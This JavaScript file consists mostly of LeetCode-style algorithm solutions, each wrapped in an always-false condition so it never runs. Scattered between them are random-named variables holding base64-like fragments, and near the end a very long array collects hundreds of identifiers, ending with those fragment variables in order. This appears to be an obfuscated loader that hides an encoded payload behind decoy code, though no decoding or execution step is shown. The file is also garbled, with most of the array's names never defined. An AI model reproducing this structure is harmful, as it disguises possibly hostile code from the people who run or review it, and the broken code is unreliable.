    ___2__          ___8__
   /      \        /      \
   0      _4       7       9
         /  \
         3   5
For example, the lowest common ancestor (LCA) of nodes 2 and 8 is 6. Another example is LCA of nodes 2 and 4 is 2, since a node can be a descendant of itself according to the LCA definition.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {TreeNode} p
 * @param {TreeNode} q
 * @return {TreeNode}
 */
var lowestCommonAncestor = function(root, p, q) {
    if (root === null || root === p || root === q) {
        return root;
    }
    
    if (root.val > p.val) {
        if (root.val < q.val) {
            return root;
        } else {
            return lowestCommonAncestor(root.left, p, q);
        }
    } else {
        if (root.val > q.val) {
            return root;
        } else {
            return lowestCommonAncestor(root.right, p, q);
        }
    }
};

}

    var ffnpdvy = 'lXWOhT';
    var jthfaq = 'JGalkyO';
    var awtadoan = 'pSweeEm';
if (0.82 && false) {
    /**
Given a linked list and a value x, partition it such that all nodes less than x come before nodes greater than or equal to x.

You should preserve the original relative order of the nodes in each of the two partitions.

For example,
Given 1->4->3->2->5->2 and x = 3,
return 1->2->2->4->3->5.

*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @param {number} x
 * @return {ListNode}
 */
var partition = function(head, x) {
    var cur = head,
        next,
        preHead,
        preTail,
        afterHead,
        afterTail;
    
    if (head === null) {
        return null;
    }
    
    while(cur) {
        next = cur.next;
        cur.next = null;
        if (cur.val < x) {
            if (!preHead) {
                preHead = cur;
                preTail = cur;
            } else {
                preTail.next = cur;
                preTail = cur;
            }
        } else {
            if (!afterHead) {
                afterHead = cur;
                afterTail = cur;
            } else {
                afterTail.next = cur;
                afterTail = cur;
            }
        }
        cur = next;
    }
    
    if (preTail) {
        preTail.next = afterHead;
        return preHead;
    } else {
        return afterHead;
    }
};

}

// world code loop await compile import script define prkw
if (37 > 101) {
    /**
There is a new alien language which uses the latin alphabet. However, the order among letters are unknown to you. You receive a list of words from the dictionary, where words are sorted lexicographically by the rules of this new language. Derive the order of letters in this language.

For example,
Given the following words in dictionary,

[
  "wrt",
  "wrf",
  "er",
  "ett",
  "rftt"
]
The correct order is: "wertf".

Note:
You may assume all letters are in lowercase.
If the order is invalid, return an empty string.
There may be multiple valid order of letters, return any one of them is fine.
*/
/**
 * @param {string[]} words
 * @return {string}
 */
var alienOrder = function(words) {
    if (words.length === 0) {
        return '';
    }
    
    const len = words.length;
    let map = {}; // value is the prerequisite of key
    let charPreReqCount = {};
    let i;
    let queue = [];
    let result = [];
    let hasCycle = false;
    
    for (i = 0; i < len; i++) {
        const chars = words[i].split('');
        
        let j = 0;
        
        for (j = 0; j < chars.length; j++) {
            if (!map[chars[j]]) {
                map[chars[j]] = [];
                charPreReqCount[chars[j]] = 0;
            }
        }

        if (i === 0 || words[i] === words[i - 1]) {
            continue;
        }
        
        const cur = words[i];
        const prev = words[i - 1];
        j = 0;
        
        while(j < cur.length && j < prev.length && cur.charAt(j) === prev.charAt(j)) {
            j++;
        }
        
        if (j < prev.length && map[prev.charAt(j)].indexOf(cur.charAt(j)) === -1) {
            map[prev.charAt(j)].push(cur.charAt(j));
            
            charPreReqCount[cur.charAt(j)]++;
        }
    }
    
    Object.keys(charPreReqCount).forEach(char => {
        if (charPreReqCount[char] === 0) {
            queue.push(char);
        }
    });
    
    while(queue.length > 0) {
        const char = queue.shift();
        
        result.push(char);
        
        for (i = 0; i < map[char].length; i++) {
            charPreReqCount[map[char][i]]--;
            
            if (charPreReqCount[map[char][i]] === 0) {
                queue.push(map[char][i]);
            }
        }
    }
    
    // detect cycle
    Object.keys(charPreReqCount).forEach(function(char) {
        if (charPreReqCount[char] !== 0) {
            hasCycle = true;
        }
    });
    
    return hasCycle ? '' : result.join('');
};

}

    var bdwbbovnd = 'cEloBVXRqe';
    var mcvnjo = 'TFiblJ';
    var kmoghlkzt = 'dtKXf';
    var xwiiorlbdvit = '6TG';
    var elinblwax = 'BmwFQ';
    var biwhfyt = '1kdmIyZHNa';
    var zffwbuqf = 'USdCYnRVN';
    var dllhqbqhwnhry = 'UzVqYjIw';
if (51 > 196) {
    /**
Given two sorted integer arrays nums1 and nums2, merge nums2 into nums1 as one sorted array.

Note:
You may assume that nums1 has enough space (size that is greater or equal to m + n) to hold additional elements from nums2. The number of elements initialized in nums1 and nums2 are m and n respectively.
*/

/**
 * @param {number[]} nums1
 * @param {number} m
 * @param {number[]} nums2
 * @param {number} n
 * @return {void} Do not return anything, modify nums1 in-place instead.
 */
var merge = function(nums1, m, nums2, n) {
    // starting from the end!
    while(m > 0 && n > 0) {
        if (nums1[m - 1] > nums2[n - 1]) {
            nums1[m + n - 1] = nums1[m - 1];
            m--;
        } else {
            nums1[m + n - 1] = nums2[n - 1];
            n--;
        }
    }
    
    while (n > 0) {
        nums1[n - 1] = nums2[n - 1];
        n--;
    }
};

}

    var laxlefepvrs = 'OVOTo';
    var dxmtqjzgysqitq = 'dkp5azdDa';
    var uiiwoy = 'bvKnknu';
if (5 === 18) {
    /**
You are playing the following Bulls and Cows game with your friend: You write down a number and ask your friend to guess what the number is. Each time your friend makes a guess, you provide a hint that indicates how many digits in said guess match your secret number exactly in both digit and position (called "bulls") and how many digits match the secret number but locate in the wrong position (called "cows"). Your friend will use successive guesses and hints to eventually derive the secret number.

For example:

Secret number:  "1807"
Friend's guess: "7810"
Hint: 1 bull and 3 cows. (The bull is 8, the cows are 0, 1 and 7.)
Write a function to return a hint according to the secret number and friend's guess, use A to indicate the bulls and B to indicate the cows. In the above example, your function should return "1A3B".

Please note that both secret number and friend's guess may contain duplicate digits, for example:

Secret number:  "1123"
Friend's guess: "0111"
In this case, the 1st 1 in friend's guess is a bull, the 2nd or 3rd 1 is a cow, and your function should return "1A1B".
You may assume that the secret number and your friend's guess only contain digits, and their lengths are always equal.
*/
/**
 * @param {string} secret
 * @param {string} guess
 * @return {string}
 */
var getHint = function(secret, guess) {
    var len = secret.length,
        bullCount = 0,
        arr = {},
        cowCount = 0,
        i;
    
    for (i = 0; i < len; i++) {
        if (!arr[secret.charAt(i)]) {
            arr[secret.charAt(i)] = 1;
        } else {
            arr[secret.charAt(i)]++;
        }
    }
    
    for (i = 0; i < len; i++) {
        if (secret.charAt(i) === guess.charAt(i)) {
            bullCount++;
            arr[secret.charAt(i)]--;
        }
    }
    
    for (i = 0; i < len; i++) {
        if (secret.charAt(i) !== guess.charAt(i) && arr.hasOwnProperty(guess.charAt(i)) && (arr[guess.charAt(i)] > 0)) {
            cowCount++;
            arr[guess.charAt(i)]--;
        }
    }
    
    return bullCount + 'A' + cowCount + 'B';
};

}

    var nraqurozgqbld = 'UFn';
    var nvyagxltkcg = 'rAwrVuPAd';
if (!true && 0) {
    /**
Given a list of non negative integers, arrange them such that they form the largest number.

For example, given [3, 30, 34, 5, 9], the largest formed number is 9534330.

Note: The result may be very large, so you need to return a string instead of an integer.

 * @param {number[]} nums
 * @return {string}
 */
var largestNumber = function(nums) {
    var i,
        len = nums.length,
        result = '',
        startWithZero = true;
    nums.sort(function(a, b){
        var x = a + '' + b,
            y = b + '' + a;
        return parseInt(y) - parseInt(x);
    });
    for (i = 0; i < len; i++) {
        if (startWithZero && nums[i] !== 0) {
            startWithZero = false;
        }
        result += nums[i];
    }
    if (startWithZero) {
        return '0';
    }
    return result;
};

}

    var jwzsrkklbe = 'SUNBZ0lDQW';
    var zxbnlzshihb = 'lfTmd';
if (0.86 && false) {
    /**
 * @param {string} s
 * @return {string}
 */
var reverseString = function(s) {
    if (!s) {
        return s;
    }
    
    return s.split('').reverse().join('');
};

}

// efpgi number object variable async loop import
    var fuzjptuvr = 'PobwZZ';
if (9 instanceof String) {
    /**
Implement an iterator to flatten a 2d vector.

For example,
Given 2d vector =

[
  [1,2],
  [3],
  [4,5,6]
]

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,2,3,4,5,6].

Hint:

    How many variables do you need to keep track?
    Two variables is all you need. Try with x and y.
    Beware of empty rows. It could be the first few rows.
    To write correct code, think about the invariant to maintain. What is it?
    The invariant is x and y must always point to a valid point in the 2d vector. Should you maintain your invariant ahead of time or right when you need it?
    Not sure? Think about how you would implement hasNext(). Which is more complex?
    Common logic in two different places should be refactored into a common method.

*/
/**
 * @constructor
 * @param {Integer[][]} vec2d
 */
var Vector2D = function(vec2d) {
    this.vec = vec2d;
    this.row = 0;
    this.col = 0;
};


/**
 * @this Vector2D
 * @returns {boolean}
 */
Vector2D.prototype.hasNext = function() {
    if (this.vec.length === 0) {
        return false;
    }
    
    if (this.col === this.vec[this.row].length) {
        this.col = 0;
        this.row++;
    }
    
    while (this.row < this.vec.length && this.vec[this.row].length === 0) {
        this.row++;
    }
    
    if (this.row === this.vec.length) {
        return false;
    }

    return true;
};

/**
 * @this Vector2D
 * @returns {integer}
 */
Vector2D.prototype.next = function() {
    const val = this.vec[this.row][this.col];
    
    this.col++;
    
    return val;
};

/**
 * Your Vector2D will be called like this:
 * var i = new Vector2D(vec2d), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var nsvvvqmwd = 'dmUW9nSU';
    var akkgcbmiayy = 'kQJN';
    var ynanbvg = 'NBZ2ZT';
if (null === 1) {
    /**
Given a matrix of m x n elements (m rows, n columns), return all elements of the matrix in spiral order.

For example,
Given the following matrix:

[
 [ 1, 2, 3 ],
 [ 4, 5, 6 ],
 [ 7, 8, 9 ]
]
You should return [1,2,3,6,9,8,7,4,5].
*/

/**
 * @param {number[][]} matrix
 * @return {number[]}
 */
var spiralOrder = function(matrix) {
    var rowL = matrix.length,
        result = [],
        columnL;
        
    if (rowL === 0) {
        return result;
    }
    
    columnL = matrix[0].length;
    
    helper(0, rowL, columnL, matrix, result);
    return result;
};

function helper(level, row, column, matrix, result) {
    var i;
    
    if (row === 0 || column === 0) {
        return;
    } else if (row === 1) {
        for (i = 0; i < column; i++) {
            result.push(matrix[level][i + level]);
        }
    } else if (column === 1) {
        for (i = 0; i < row; i++) {
            result.push(matrix[i + level][level]);
        }
    } else {
        // top
        for (i = 0; i < column - 1; i++) {
            result.push(matrix[level][i + level]);
        }
        
        // right
        for (i = 0; i < row - 1; i++) {
            result.push(matrix[i + level][column + level - 1]);
        }
        
        // bottom
        for (i = column - 1; i > 0; i--) {
            result.push(matrix[row + level - 1][i + level]);
        }
        
        // left
        for (i = row - 1; i > 0; i--) {
            result.push(matrix[i + level][level]);
        }
        
        helper(level + 1, row - 2, column - 2, matrix, result);
    }
}

}

    var cvfllsjdhws = 'TwehI';
    var alkdqsbcia = 'd2dNVE';
if (typeof window === 'undefined') {
    /**
Given an integer, write a function to determine if it is a power of three.

Follow up:
Could you do it without using any loop / recursion?
*/
/**
 * @param {number} n
 * @return {boolean}
 */
var isPowerOfThree = function(n) {
    while (n >= 3) {
        if (n % 3 !== 0) {
            break;
        }
        
        n = n / 3;
    }
    
    return n === 1;
};

// Math solution
/**
 * @param {number} n
 * @return {boolean}
 */
var isPowerOfThree = function(n) {
    return (Math.log10(n) / Math.log10(3)) % 1 === 0;
};

}

    var asgqggcg = 'vlreJZaef';
    var jvurx = 'F3S1RzS2';
    var pywecorlg = 'ReLt';
    var mfxtzwdjiw = 'ZTa29';
    var vyedaavgobs = 'cIkUrkbG';
if (!true && 0) {
    /**
Write an algorithm to determine if a number is "happy".

A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers.

Example: 19 is a happy number

12 + 92 = 82
82 + 22 = 68
62 + 82 = 100
12 + 02 + 02 = 1

 * @param {number} n
 * @return {boolean}
 */
var isHappy = function(n) {
    var cur = n,
        num,
        i,
        len,
        result = [],
        sum = 0,
        sums = [];
    while (true) {
        while (cur !== 0) {
            num = cur%10;
            result.push(num);
            cur = (cur - num)/10;
        }
        len = result.length;
        for(i = 0; i < len; i++) {
            sum += Math.pow(result[i], 2);
        }
        if (sum === 1) {
            return true;
        } else {
            if (sums.indexOf(sum) !== -1) {
                return false;
            } else {
                sums.push(sum);
                result = [];
                cur = sum;
                sum = 0;
            }
        }
    }
};

}

    var xtagfxcprze = 'LVH';
    var webyephb = 'piDFJRp';
    var jvpsft = 'NLIikpOwo=';
if (0.45 && false) {
    /**
Given an integer (signed 32 bits), write a function to check whether it is a power of 4.

Example:
Given num = 16, return true. Given num = 5, return false.

Follow up: Could you solve it without loops/recursion?
*/
/**
 * @param {number} num
 * @return {boolean}
 * 在Power of Two中，我们有一个解法是通过判断n & (n - 1)是否为0来判断是否为2的幂，因为4的幂肯定也是2的幂，
 * 所以这也可以用到这题来。那4的幂和2的幂有什么区别呢？根据上一个解法，我们知道4的幂的1只可能在奇数位，
 * 而2的幂的1可能在任意位，所以我们只要判断是不是奇数位是1就行了。
 * 因为根据n & (n - 1)我们已经筛出来那些只有1个1的数了，所以和010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101 
 * 也就是0x5555555555555555相与就能知道1是在奇数位还是偶数位了。
 */
var isPowerOfFour = function(num) {
    return (num > 0) && ((num & (num - 1)) === 0) && ((num & 0x5555555555555) == num);
};

}

    var qytlvkna = 'OPKooBXXhZ';
if ('false' === true) {
    /**
Given an array nums, there is a sliding window of size k which is moving from the very left of the array to the very right. You can only see the k numbers in the window. Each time the sliding window moves right by one position.

For example,
Given nums = [1,3,-1,-3,5,3,6,7], and k = 3.

Window position                Max
---------------               -----
[1  3  -1] -3  5  3  6  7       3
 1 [3  -1  -3] 5  3  6  7       3
 1  3 [-1  -3  5] 3  6  7       5
 1  3  -1 [-3  5  3] 6  7       5
 1  3  -1  -3 [5  3  6] 7       6
 1  3  -1  -3  5 [3  6  7]      7
Therefore, return the max sliding window as [3,3,5,5,6,7].

Note: 
You may assume k is always valid, ie: 1 ≤ k ≤ input array's size for non-empty array.

Follow up:
Could you solve it in linear time?

Hint:

How about using a data structure such as deque (double-ended queue)?
The queue size need not be the same as the window’s size.
Remove redundant elements and the queue should store only elements that need to be considered.
*/
/**
 * @param {number[]} nums
 * @param {number} k
 * @return {number[]}
 * 
 * Maintain an array for possible maximum value's index between [i - k + 1, i]
 * 
 * if arr[0] < i - k + 1, pop
 * 当下标i从队尾入队时，顺次弹出队列尾部不大于nums[i]的数组下标（这些被弹出的元素由于新元素的加入而变得没有意义）
 * 队头元素即为当前滑动窗口的最大值
 */
var maxSlidingWindow = function(nums, k) {
    var result = [],
        queue = [],
        len = nums.length,
        i;
    
    if (k > len || k === 0) {
        return result;
    }
    
    for (i = 0; i < len; i++) {
        while (queue.length > 0 && nums[queue[queue.length - 1]] < nums[i]) {
            queue.pop();
        }
        
        if (queue[0] < i - k + 1) {
            queue.shift();
        }
        
        queue.push(i);
        
        if (i >= k - 1) {
            result.push(nums[queue[0]]);
        }
    }
    
    return result;
};

}

    var wenomk = [tdnmjdtzdwv, dmdixichhpfje, thgzjefdwqjxhp, kdikfcuisqh, uletbodhjx, ywhjycudt, thhkleceajftzt, mvfnearueup, kacqkfxnte, drnnksurjqp, mypvy, fhwateu, jlpvoqllabgxm, dvgcsuafm, wbhac, qeygxk, juhpmv, amkvlj, cqpsbxjrgjzttyj, raxgxqg, oiplogmedzkpw, bzbqdgss, ydjfcwahak, hcmyj, yucmaydysxm, mjbvjnradlmdyom, qsehciaia, zhqjcfbjcc, wevoot, hzpcs, rdcxzetxxq, syqquff, fiasfhtlbf, ljpzehdcthd, acgfe, vgfolwpkuruian, wmqodjhamvknp, xbrmswibbbxkhe, usmnjfabvq, pzfdhyouwwwrku, zwxwkav, xugcpjqv, xlzbsfnmbya, fkyeketuj, sogob, hrmptlhfmokgg, wbiabehzoxnaq, uojdhhaypyp, tqzojbnnemxd, lhiykeqecbadkb, zechm, bdstbyr, rbputuqwtoamqwe, ersvlem, yahtclyisrcxl, ctfuu, fpwzipwhnwid, cohnilfxi, ysqoh, zgcjicucpfic, snqehdanxt, wqxlkyxks, wzzdd, sgplmblhifrbrkf, mqhuivpmfasj, mrvrmkytcvxxc, dnjtfdtipmp, xmofesyjwnkgnk, eiedfygeim, agjbwuexpyoor, qynojudpfwwky, xoxpdnxdpm, puswjbicdpnv, gqtenk, vctlhkudjjetxr, uxatyzjsi, jmasrh, zrdrwqslckyt, mbcuayxtbaeob, hcoscfwrp, prqfa, xbvyvncxavgusq, yajxocgmyezcvd, comfhdpmxr, xlpovvy, ltpcknnpsucohtc, ifiofdw, xvlmlhgsvm, vgfgushp, sipgh, rhwjdvxgp, ywuvxkt, scxerls, negrerh, smdxcdxntroe, qzzaszlbytx, igxylpicitswc, blbuecsujyslds, prztovqddqcfu, nttnkq, vgtvfrjkm, mgqat, nzzohublrmlic, nyaojkoweujnbl, xkrkltgmljhmff, qbfovz, zrbosrq, huyodkmxsne, gmjoboszzhulo, lcyvhyihoxufjhr, xjlpvrwil, hpsjiwphlrnt, rvftqxjbaswnfx, qpywrlomq, rldbsbosaok, synnpusbxj, jxkqungttqhf, lwoqrv, dqosvuwunvwpict, molkryxmewgpvgz, foyadwmmdv, tiovia, yokyonxzeprolxh, lfpye, gvofyuebkv, wtplirh, cdyrrlcqk, dkinpkgomwv, kazotfysuepz, epcijuixjczud, esuxkrqvemx, vxnsapn, kcgiedbcsvb, tttlqnd, jxurc, gvyffiwttcz, twvnh, ovwhtndiwupik, utqukwtzywph, bhehy, hlwgrpkkpcmbh, fvexbwdype, ooummtypcm, lcvsjmsoxlsx, mafwkqntvllzppg, belxpqu, wwrqvdknzhlkehk, xjtlsycja, wdnvkrmng, ewxohsfxbg, zcudgyttknpu, zsclypdetfldkj, fpwhic, eummcnrusctgpgo, neilojoqirnam, fijyoc, kkwhmw, dkhsfo, rqgvqdwcbpi, tjlgbfdoqkvg, vsaynhyxt, pqzatdzs, csnbckbxjryzhc, xmngbhvlxe, jftdmodgxubi, iuwgtraibifmz, inzljhhedtkst, lkduwsym, gcjipneghxizucj, orgbytkc, dablhzldjk, rnbbtdttveeqonz, hkxatcaastaptwk, wbevdjsgqycqh, qefrfevj, olxcrbrobv, xhkyhw, yokqu, rhesypwffpqv, qdeejztfkp, onzoxjoosjgykcu, wcnouv, jmbjqdhtprkkzbu, wtoyfdluse, vbkncozyn, gjgapw, wqdbf, fcadzeufznyux, cqsainntvevd, mrdnbmng, uppyjjoxtgvvadj, imfac, feseajmjxvrthn, eofrx, auijjwg, mwbcdfr, bbxbivcnfjck, aniondiihcg, gkosbqxctcpzfn, efubykfvqevj, xiaqxbkjeyunr, sjitjdfyovwfm, gvxznmddxmjhth, jjzcmw, kzenrzdqy, gwhpmwraf, ctreaagrflqkj, wgqnsnpxms, jgnenydiiqxgds, khgqriours, nyxkgt, xixpzzyyyyiafcf, dryjeempetxp, cuyfojzjiskkmw, dyblkaxsoa, szifydnjecruof, wnvnmhagsekvvya, cblhvmayvyv, xkrycioblzc, wzfccgd, hyynctaogdx, xdrnlvlyc, sseyidx, htuxnxlfhvvaef, wyulygwm, ktmddfhxavwmru, xyujjbnjre, hughicelvjfry, nafnewyf, szqbn, kvimb, zbczd, gspyleuib, shpwtnavbgih, qvcke, dtgnlnhhd, jhyoy, pajtez, psejnlthcgte, njzbpbtswwwhe, ibcrxiznpfdfos, nwjnbyhehketdle, wurdn, zockdhelyf, jxtlwncgnynqegh, thxlbnacwefmcxa, pqxmgmmqabmbn, xvjoszhg, lgxssbxvvchsz, uuzuhhvunzdva, kaqlmq, bionbvrdd, lqgqxfksogzey, okoprx, xuvtgo, wpmfat, ytlfgxvzw, bawlmlmo, tjctiprndvyr, pxrxpqdqgjpc, tqqbulwzi, xkojj, pwxyhgnsq, aqich, utbooqkc, idkuliltu, uhvnhhhms, siygwp, ipptgrbyaguz, qwkkkpmtz, dhpmzrqwblaasyg, iwvfwbznxuw, bccbvpkgorlx, elruvqvesutjsxd, jgugpk, uhbfrirerjajkc, pezlaxsskhr, smiqatzaztozhiy, smlztfuth, wcfjdkpllqsbnpo, tltnul, zwyisiy, khhncnrwgvfl, gligaqjiqlz, xfmtp, jjbmnlv, nympvkcgu, wamvhfzzwk, cojjvqgiap, dsjlutyfkba, ompuyumqowpc, nfzysqqyss, umwecldkuyhljf, butijgxmkxmb, ansmhys, kwuhtuwgb, gpeowjqwj, ebdmzevqeio, bmnsrp, bzowmxsz, krgatewps, lbfivyjofygzl, ysbwollvynoutl, gznovmxikvjm, ohlhmth, tenalrha, xexrklwpylefh, ywzsidz, rskwzmldur, rlqsv, ufmcgosucwma, qzmvmx, nenonfnmp, enacvpzy, jszulspa, yfqeoq, lndxb, yukoy, umdfymrgnyseyxp, hihqw, pdslwsziuzbju, xphfcf, phahpfg, iehvwbqw, ahdwmptqbyjpe, toewszkonqw, vgansgrbqon, hvtoytbx, ifhcqpfbstrh, apxjijyzhmrf, pvmfrhemskqmkg, sqpmeavma, sxsnyftlehharl, svvaaikdeax, ikdqhlr, olvmlq, hdxizwqf, rdkusqwsxsuzg, gmthhxe, adzbjhnsutrytsv, wnfuwlcj, qdyveddpvdnbog, qwtjugj, mhcygymzvykm, dqiypacebmgl, thhxctrrhbks, xibzuy, jnkfngx, kswscanvi, vpdoo, ojkowcspvvsfzs, fopci, ugqegkzbwld, xfzct, pkurapwgieysxhr, nkbznkdcanyqx, vdusvnidkkugjvx, qlkdnunjyrtxgda, bxkgzptxdr, krykyquetiqq, lkgkwi, zzehpdlrvxrxwap, feiak, mstagjvrxpkfpar, xyrexaf, euqfu, scxxpolpybzi, jgbfbdjcv, bkigtbxjtuvoirz, lszkoubxwms, fhxbjcagchbfxj, gauhxkbt, gbregtdwxoetuuy, wowksqggwgtavbs, dwatfxy, khdxlugsbena, qoblkisidbxbc, ninkjcfbs, xsnvmedx, ezfehy, hhueucwfvwiw, ecvavldw, azimnrj, klfvcbv, cenpvppeltrvzl, vmptxq, jefpagq, lcnjptdu, vrdlmkcf, sulrid, liukkwmko, mtrhyxjscxboee, aheusrfvdi, lyutqxwphddclio, zxxohtcdvk, yxuizyhx, lwbhhdz, zbrfmqjuqgtawjl, mbwhcruyedv, llitlkkm, loxjfmsf, trcykkzqfdlss, xeyrk, wvblslarulmwicg, tkrggnymkkjhk, udxzgctfhzvexpz, kbkyxixcebho, tanhchpt, adqslcogyt, dppnlu, ycwuegvj, qituabr, tibajyrphhyx, pjpifnn, rvxaam, srnfg, vzzzydogb, evucc, mrsgvtlnzhos, rdeowh, vuhcxceqcd, pscedfdafje, mrojpvxvtyu, jvgcxnxbonjnxa, dqwymibeiiz, yzkyzugah, txxqxwlmpjv, wewqzfteswerm, nngvpk, dttponcygclairb, cevrhtib, adhmhczpdr, yuepxsgxuwfzote, npuzgyepez, drzssi, mvzpw, hhrap, qwslbtggrsp, simohiybowvpmss, tscpypdrwaevpgw, fngrelvuvfgq, aabmppzcoxcc, fcmqbdi, akvyj, rmgnxhrwzkgip, uutaflbjmqbfu, ahfawmloy, jikeoy, bnnlezlqdxsbudw, qsstkjmavqz, svnycc, hfmusxjrakdrwd, ifyucf, aolgtffmusg, brsgs, yjfdarvnt, dpkcad, kxuzijzpdjeztp, oyoihn, iipnzbfxkxdzmb, jtjnbzkiw, kcymnexsxw, kddmqeunqu, rygzwnlqkern, fzlgvvjm, fcqkmukoegvb, hupjxsrl, ordundkjjqzfhih, xugcsziboyleh, xvumuxma, wcpiqigppcfarz, hxslen, gvkyzfdhhtsdplr, awwukaajwaf, pkylgqhqz, ifirkmws, gzvvehxf, fgiifvfcfmdor, fwjgretc, qqsosfgmmush, lmsngdkdmghiy, qidzihxnwm, ixdqkovq, jkurrfm, sudisallqfp, ipugsshwbwubx, ttqpwrrqdrbypt, obldgtj, comecbzjbor, nirkm, qbudgeylwa, wkcuykagfci, hunwqavvaliarsr, zhldr, okpwp, lwkcrnn, dpaqhistvyta, ctqllzpvpylk, ltfohr, rrjghjaxp, ohaogirjsol, bnniuzwzrfxjfs, urezcpeo, mlkvlnnhvxatafa, ecieikfbwprij, ekfcwoz, ijcevejlomewc, lgxflvwvrnk, nfivt, wiguvxjdyy, jthfaq, mcvnjo, xwiiorlbdvit, biwhfyt, dllhqbqhwnhry, dxmtqjzgysqitq, nraqurozgqbld, jwzsrkklbe, nsvvvqmwd, ynanbvg, alkdqsbcia, jvurx, mfxtzwdjiw, xtagfxcprze, jvpsft];
if (null === 0) {
    /**
Two elements of a binary search tree (BST) are swapped by mistake.

Recover the tree without changing its structure.

Note:
A solution using O(n) space is pretty straight forward. Could you devise a constant space solution?
*/

// SOLUTION 1: O(N)
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {void} Do not return anything, modify root in-place instead.
 */
var recoverTree = function(root) {
    let array = [];
    treeToArray(root, array);
    
    let node1, node2;
    
    for (let i = 0; i < array.length - 1; i++) {
        if (array[i][0] > array[i + 1][0]) {
            if (!node1) {
                node1 = array[i][1];
                node2 = array[i + 1][1];
            } else {
                node2 = array[i + 1][1];
            }
        }
    }
    
    let temp = node1.val;
    node1.val = node2.val;
    node2.val = temp;
};

function treeToArray(root, array) {
    if (!root) {
        return;
    }
    
    treeToArray(root.left, array);
    array.push([root.val, root]);
    treeToArray(root.right, array);
}


// SOLUTION 2: constant space
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {void} Do not return anything, modify root in-place instead.
 */
var recoverTree = function(root) {
    let array = [];
    inorderTraverse(root, array);
    
    let node1 = array[1];
    let node2 = array[2];
    
    let temp = node1.val;
    node1.val = node2.val;
    node2.val = temp;
};

function inorderTraverse(root, array) {
    if (!root) {
        return;
    }
    
    inorderTraverse(root.left, array);
    
    if (array[0] && array[0].val > root.val) {
        if (!array[1]) {
            array[1] = array[0];
            array[2] = root;
        } else {
            array[2] = root;
        }
        
    }
    array[0] = root;
    
    inorderTraverse(root.right, array);
}

}

    var irhzzdhr = 'xjjqMSbzS';
if ('v' === 'N') {
    /**
The gray code is a binary numeral system where two successive values differ in only one bit.

Given a non-negative integer n representing the total number of bits in the code, print the sequence of gray code. A gray code sequence must begin with 0.

For example, given n = 2, return [0,1,3,2]. Its gray code sequence is:

00 - 0
01 - 1
11 - 3
10 - 2
Note:
For a given n, a gray code sequence is not uniquely defined.

For example, [0,2,3,1] is also a valid gray code sequence according to the above definition.

For now, the judge is able to judge based on one instance of gray code sequence. Sorry about that.
*/
/**
 * @param {number} n
 * @return {number[]}
 * 
 * 例举grey code序列，并找规律 :
n = 0: 0
n = 1: 0, 1
n = 2: 00, 01, 11, 10  (0, 1, 3, 2)
n = 3: 000, 001, 011, 010, 110, 111, 101, 100 (0, 1, 3, 2, 6, 7, 5, 4)
以n = 3为例，grey code中前4个包括了n = 2的所有gray code。后4个则是前4个逆序后加上2^2。

推广：n = i的grey code的前一半包括了n = i-1的所有grey code，而后一半则为前一半逆序后家上2^(i-1)
 */
var grayCode = function(n) {
    var result = [],
        cur,
        i,
        j;
    
    result [0] = 0;
    
    if (n === 0) {
        return result;
    }
    
    for (i = 1; i <= n; i++) {
        for (j = Math.pow(2, i - 1); j > 0; j--) {
            result.push(result[j - 1] + (1 << (i - 1)));
        }
    }
    
    return result;
};

}


if ('false' === true) {
    /**
Follow up for problem "Populating Next Right Pointers in Each Node".

What if the given tree could be any binary tree? Would your previous solution still work?

Note:

You may only use constant extra space.
For example,
Given the following binary tree,
         1
       /  \
      2    3
     / \    \
    4   5    7
After calling your function, the tree should look like:
         1 -> NULL
       /  \
      2 -> 3 -> NULL
     / \    \
    4-> 5 -> 7 -> NULL
Subscribe to see which companies asked this question
*/
/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    if (!root) {
        return;
    }
    
    var curRow = [],
        nextRow = [],
        i;
        
    curRow.push(root);
    
    while (curRow.length > 0) {
        for (i = 0; i < curRow.length; i++) {
            if (curRow[i].left) {
                nextRow.push(curRow[i].left);
            }
            
            if (curRow[i].right) {
                nextRow.push(curRow[i].right);
            }
            
            if (i < curRow.length - 1) {
                curRow[i].next = curRow[i + 1];
            } else {
                curRow[i].next = null;
            }
        }
        
        curRow = nextRow;
        nextRow = [];
    }
};


// O(1) space solution

/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    let nextHead = null;
    let cur = root;
    let nextCur = null;
    
    while (cur !== null) {
        
        while (cur !== null) {
            if (cur.left) {
                if (!nextHead) {
                    nextHead = cur.left;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.left;
                    nextCur = nextCur.next;
                }
            }
            
            if (cur.right) {
                if (!nextHead) {
                    nextHead = cur.right;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.right;
                    nextCur = nextCur.next;
                }
            }
            
            cur = cur.next;
        }
        
        cur = nextHead;
        nextHead = null;
        nextCur = null;
    }
};

}

    var tfzwwoongtvj = 'DcuuafCcrg';
if (Array.isArray(10)) {
    /**
Given a singly linked list, group all odd nodes together followed by the even nodes. Please note here we are talking about the node number and not the value in the nodes.

You should try to do it in place. The program should run in O(1) space complexity and O(nodes) time complexity.

Example:
Given 1->2->3->4->5->NULL,
return 1->3->5->2->4->NULL.

Note:
